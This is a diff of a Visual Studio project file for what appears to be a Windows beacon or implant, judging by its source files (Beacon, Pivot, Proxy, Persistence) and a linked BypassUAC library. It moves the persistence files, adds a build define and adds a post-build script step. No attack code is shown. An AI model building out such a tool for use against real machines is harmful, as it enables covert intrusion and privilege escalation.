@@ -106,13 +106,13 @@
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>false</SDLCheck>
-      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_FULL;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
       <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
       <BufferSecurityCheck>false</BufferSecurityCheck>
       <AdditionalIncludeDirectories>$(SolutionDir)\Utils;$(SolutionDir)\BypassUAC;D:\App\Dev Tools\systeminformer\phnt\include</AdditionalIncludeDirectories>
       <SupportJustMyCode>false</SupportJustMyCode>
-      <DisableSpecificWarnings>6258;6031;6053;6387;6302;6001;6054;6386;6011;28159;6308;28183;28193;28182;6385</DisableSpecificWarnings>
+      <DisableSpecificWarnings>6335;6258;6031;6053;6387;6302;6001;6054;6386;6011;28159;6308;28183;28193;28182;6385</DisableSpecificWarnings>
       <BasicRuntimeChecks>Default</BasicRuntimeChecks>
       <PrecompiledHeader>Use</PrecompiledHeader>
       <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
@@ -127,6 +127,9 @@
       <AdditionalDependencies>userenv.lib;ktmw32.lib;rpcrt4.lib;dnsapi.lib;iphlpapi.lib;Version.lib;dbghelp.lib;ws2_32.lib;crypt32.lib;taskschd.lib;wbemuuid.lib;bcrypt.lib;ntdll.lib;winhttp.lib;ShLwApi.lib;strsafe.lib;wininet.lib;Utils.lib;BypassUAC.lib;advapi32.lib;wtsapi32.lib;$(CoreLibraryDependencies);%(AdditionalDependencies)</AdditionalDependencies>
       <RandomizedBaseAddress>false</RandomizedBaseAddress>
     </Link>
+    <PostBuildEvent>
+      <Command>python $(SolutionDir)\Script\set_exec_flag.py $(TargetPath)</Command>
+    </PostBuildEvent>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
@@ -146,7 +149,6 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="..\Utils\Persistence.c" />
     <ClCompile Include="Beacon.c" />
     <ClCompile Include="Drive.c" />
     <ClCompile Include="Handler.c" />
@@ -156,6 +158,7 @@
     <ClCompile Include="pch.c">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
     </ClCompile>
+    <ClCompile Include="Persistence.c" />
     <ClCompile Include="Pivot.c" />
     <ClCompile Include="Proxy.c" />
     <ClCompile Include="Session.c" />
@@ -165,13 +168,13 @@
     <ClCompile Include="Uri.c" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="..\Utils\Persistence.h" />
     <ClInclude Include="Beacon.h" />
     <ClInclude Include="Drive.h" />
     <ClInclude Include="Handler.h" />
     <ClInclude Include="Http.h" />
     <ClInclude Include="NamedPipe.h" />
     <ClInclude Include="pch.h" />
+    <ClInclude Include="Persistence.h" />
     <ClInclude Include="Pivot.h" />
     <ClInclude Include="Proxy.h" />
     <ClInclude Include="Session.h" />
